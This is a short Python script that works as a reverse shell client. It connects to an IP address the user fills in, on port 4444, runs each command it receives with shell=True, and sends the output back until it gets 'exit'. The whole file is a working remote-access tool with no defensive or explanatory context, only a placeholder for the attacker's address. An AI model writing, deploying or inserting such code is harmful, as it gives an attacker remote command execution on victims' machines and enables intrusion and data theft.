import socket
import subprocess

def connect_to_server(server_ip='#input ip here#', server_port=4444):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except Exception as e:
            output = str(e)
        client_socket.send(output.encode())

    client_socket.close()

if __name__ == "__main__":
    connect_to_server()